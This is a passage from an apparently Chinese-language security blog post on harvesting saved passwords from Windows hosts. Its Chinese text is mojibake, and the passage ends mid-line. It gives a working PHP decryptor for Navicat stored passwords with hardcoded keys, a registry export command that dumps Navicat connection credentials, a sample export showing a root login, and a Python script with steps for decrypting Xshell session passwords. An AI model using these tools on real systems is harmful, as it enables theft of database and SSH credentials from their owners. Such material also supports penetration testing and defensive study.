class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">FatSmallTools</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NavicatPassword</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$version</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesKey</span> = <span class="string">&#x27;libcckeylibcckey&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$aesIv</span> = <span class="string">&#x27;libcciv libcciv &#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowString</span> = <span class="string">&#x27;3DC5CA39&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowKey</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$blowIv</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$version</span> = <span class="number">12</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;version = <span class="variable">$version</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blowKey = sha1(<span class="string">&#x27;3DC5CA39&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blowIv = hex2bin(<span class="string">&#x27;d9c7c3c8870d64bd&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;encryptEleven(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;encryptTwelve(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptEleven</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$round</span> = intval(floor(strlen(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = strlen(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;blowIv;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$temp</span> = <span class="keyword">$this</span>-&gt;encryptBlock(<span class="keyword">$this</span>-&gt;xorBytes(substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>), <span class="variable">$currentVector</span>));</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;xorBytes(<span class="variable">$currentVector</span>, <span class="variable">$temp</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;encryptBlock(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="keyword">$this</span>-&gt;xorBytes(substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> strtoupper(bin2hex(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> openssl_encrypt(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="keyword">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> openssl_decrypt(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="keyword">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">xorBytes</span>(<span class="params"><span class="variable">$str1</span>, <span class="variable">$str2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str1</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$result</span> .= chr(ord(<span class="variable">$str1</span>[<span class="variable">$i</span>]) ^ ord(<span class="variable">$str2</span>[<span class="variable">$i</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptTwelve</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = openssl_encrypt(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="keyword">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="keyword">$this</span>-&gt;aesIv);</span><br><span class="line">        <span class="keyword">return</span> strtoupper(bin2hex(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;decryptEleven(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;decryptTwelve(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptEleven</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = hex2bin(strtolower(<span class="variable">$upperString</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$round</span> = intval(floor(strlen(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = strlen(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;blowIv;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$encryptedBlock</span> = substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="variable">$temp</span> = <span class="keyword">$this</span>-&gt;xorBytes(<span class="keyword">$this</span>-&gt;decryptBlock(<span class="variable">$encryptedBlock</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;xorBytes(<span class="variable">$currentVector</span>, <span class="variable">$encryptedBlock</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;encryptBlock(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="keyword">$this</span>-&gt;xorBytes(substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptTwelve</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = hex2bin(strtolower(<span class="variable">$upperString</span>));</span><br><span class="line">        <span class="keyword">return</span> openssl_decrypt(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="keyword">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="keyword">$this</span>-&gt;aesIv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">FatSmallTools</span>\<span class="title">NavicatPassword</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//éœ€è¦æŒ‡å®šç‰ˆæœ¬ï¼Œ11æˆ–12</span></span><br><span class="line"><span class="variable">$navicatPassword</span> = <span class="keyword">new</span> NavicatPassword(<span class="number">11</span>);</span><br><span class="line"><span class="comment">//å¡«ä¸Šä½ çš„åŠ å¯†çš„å¯†ç </span></span><br><span class="line"><span class="variable">$decode</span> = <span class="variable">$navicatPassword</span>-&gt;decrypt(<span class="string">&#x27;EF176B08C2D7735DB81C&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decode</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="ä¸èƒ½RDPè¿æ¥åˆ°æœºå™¨"><a href="#ä¸èƒ½RDPè¿æ¥åˆ°æœºå™¨" class="headerlink" title="ä¸èƒ½RDPè¿æ¥åˆ°æœºå™¨"></a>ä¸èƒ½RDPè¿æ¥åˆ°æœºå™¨</h4><p>ä½¿ç”¨å‘½ä»¤æ¥ä¿å­˜æ³¨å†Œåˆ—è¡¨çš„å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg export HKCU\SOFTWARE\PremiumSoft\Navicat\Servers navicat</span><br></pre></td></tr></table></figure><p>æå–å‡ºæ¥çš„å†…å®¹å¦‚ä¸‹ï¼Œè§£å¯†æ–¹å¼å’Œä¸Šé¢ä¸€æ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers\test]</span><br><span class="line">&quot;ConnType&quot;&#x3D;&quot;ctMYSQL&quot;</span><br><span class="line">&quot;ConnTypeOra&quot;&#x3D;&quot;ctoBasic&quot;</span><br><span class="line">&quot;TNS&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;DatabaseFileName&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;Host&quot;&#x3D;&quot;127.0.0.1&quot;</span><br><span class="line">&quot;Port&quot;&#x3D;dword:00000cea</span><br><span class="line">&quot;InitialDatabase&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;OraServiceNameType&quot;&#x3D;&quot;snServiceName&quot;</span><br><span class="line">&quot;MSSQLAuthenMode&quot;&#x3D;&quot;mamSQLServer&quot;</span><br><span class="line">&quot;UserName&quot;&#x3D;&quot;root&quot;</span><br><span class="line">&quot;Pwd&quot;&#x3D;&quot;EF176B08C2D7735DB81C&quot;</span><br><span class="line">&quot;AskPassword&quot;&#x3D;&quot;false&quot;</span><br><span class="line">&quot;Codepage&quot;&#x3D;dword:0000fde9</span><br><span class="line">&quot;OraRole&quot;&#x3D;&quot;orDefault&quot;</span><br><span class="line">&quot;OraOSAuthentication&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;AutoConnect&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;QuerySavePath&quot;&#x3D;&quot;C:\\Users\\ascotbe\\Documents\\Navicat\\MySQL\\servers\\test&quot;</span><br><span class="line">&quot;UseCompression&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;UseCharacterSet&quot;&#x3D;dword:00000001</span><br><span class="line">&quot;UsePingInterval&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;PingInterval&quot;&#x3D;dword:000000f0</span><br><span class="line">&quot;UseNamedPipe&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;NamedPipeSocket&quot;&#x3D;&quot;&#x2F;tmp&#x2F;mysql.sock&quot;</span><br><span class="line">&quot;SQLiteEncrypted&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;UseEncryption&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;UseAdvSettings&quot;&#x3D;&quot;false&quot;</span><br><span class="line">&quot;UseSSL&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;UseSSLAuthen&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;PGSSLMode&quot;&#x3D;&quot;smRequire&quot;</span><br><span class="line">&quot;ClientKey&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;ClientCert&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;CACert&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;VerifyCACert&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;Cipher&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;PGSSLCRL&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;UseSSH&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;SSH_Host&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;SSH_Port&quot;&#x3D;dword:00000016</span><br><span class="line">&quot;SSH_UserName&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;SSH_AuthenMethod&quot;&#x3D;&quot;saPassword&quot;</span><br><span class="line">&quot;SSH_SavePassword&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;SSH_PrivateKey&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;SSH_SavePassphrase&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;UseHTTP&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_URL&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HTTP_EncodeBase64&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_Authen&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_Username&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HttpSavePassword&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_CertAuth&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_ClientKey&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HTTP_ClientCert&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HTTP_CACert&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HTTP_Passphrase&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HTTP_Proxy&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_ProxyHost&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HTTP_ProxyPort&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;HTTP_ProxyUsername&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;HttpProxySavePassword&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;NSYID&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;NSYHash&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;NSYNavicatID&quot;&#x3D;&quot;&quot;</span><br><span class="line">&quot;NSYDirtyFlag&quot;&#x3D;dword:00000000</span><br><span class="line">&quot;AskForSavePassword&quot;&#x3D;dword:00000000</span><br></pre></td></tr></table></figure><h2 id="SSHå¯†ç "><a href="#SSHå¯†ç " class="headerlink" title="SSHå¯†ç "></a>SSHå¯†ç </h2><h3 id="Xshellå¯†ç "><a href="#Xshellå¯†ç " class="headerlink" title="Xshellå¯†ç "></a>Xshellå¯†ç </h3><p>é»˜è®¤ä¿å­˜è·¯å¾„</p><table><thead><tr><th>ç‰ˆæœ¬</th><th>è·¯å¾„</th></tr></thead><tbody><tr><td>Xshell 5</td><td>%userprofile%\Documents\NetSarang\Xshell\Sessions</td></tr><tr><td>Xshell 6</td><td>%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td></tr><tr><td>Xshell 7</td><td>%userprofile%\Documents\NetSarang Computer\7\Xshell\Sessions</td></tr></tbody></table><p>å…³äºxshellåŠ å¯†æ–¹å¼å¯ä»¥æŸ¥çœ‹<a href="https://rcoil.me/2019/09/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/">è¿™ç¯‡æ–‡ç« </a></p><h4 id="Xshell-5-amp-Xshell-6"><a href="#Xshell-5-amp-Xshell-6" class="headerlink" title="Xshell 5&amp;Xshell 6"></a>Xshell 5&amp;Xshell 6</h4><p>é¦–å…ˆéœ€è·å–åˆ°ç”¨æˆ·çš„SIDå€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\ascotbe&gt; whoami &#x2F;user</span><br><span class="line"></span><br><span class="line">ç”¨æˆ·ä¿¡æ¯</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">ç”¨æˆ·å           SID</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">æ¨±å²›éº»è¡£\ascotbe S-1-5-21-1645164750-2672341361-3879437546-1000</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨è„šæœ¬è§£å¯†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\xshell.py -s username+sid -p <span class="string">&quot;æ–‡ä»¶è·¯å¾„&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/19.png" alt="image-20210611142341029"></p><p>è„šæœ¬ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line"><span class="comment">#pip install pycryptodome</span></span><br><span class="line"><span class="comment">#pip install pywin32</span></span><br><span class="line"><span class="keyword">from</span> win32api <span class="keyword">import</span> GetComputerName, GetUserName</span><br><span class="line"><span class="keyword">from</span> win32security <span class="keyword">import</span> LookupAccountName, ConvertSidToStringSid</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_string</span>(<span class="params">a1, a2</span>):</span></span><br><span class="line">    v1 = base64.b64decode(a2)</span><br><span class="line">    v3 = ARC4.new(SHA256.new(a1.encode(<span class="string">&#x27;ascii&#x27;</span>)).digest()).decrypt(v1[:<span class="built_in">len</span>(v1) - <span class="number">0x20</span>])</span><br><span class="line">    <span class="keyword">if</span> SHA256.new(v3).digest() == v1[-<span class="number">32</span>:]:</span><br><span class="line">        <span class="keyword">return</span> v3.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;xsh, xfp password decrypt&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-s&quot;</span>, <span class="string">&quot;--sid&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;`username`+`sid`, user `whoami /user` in command.&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--password&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;the password in sessions or path of sessions&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.sid:</span><br><span class="line">    args.sid = GetUserName() + ConvertSidToStringSid(LookupAccountName(GetComputerName(), GetUserName())[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.password:</span><br><span class="line">    args.password = os.path.join(os.environ[<span class="string">&quot;USERPROFILE&quot;</span>], <span class="string">r&quot;Documents\NetSarang Computer\6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(args.password):</span><br><span class="line">    r = decrypt_string(args.sid, args.password)</span><br><span class="line">    <span class="keyword">if</span> r:</span><br><span class="line">        print(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(args.password):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> f.endswith(<span 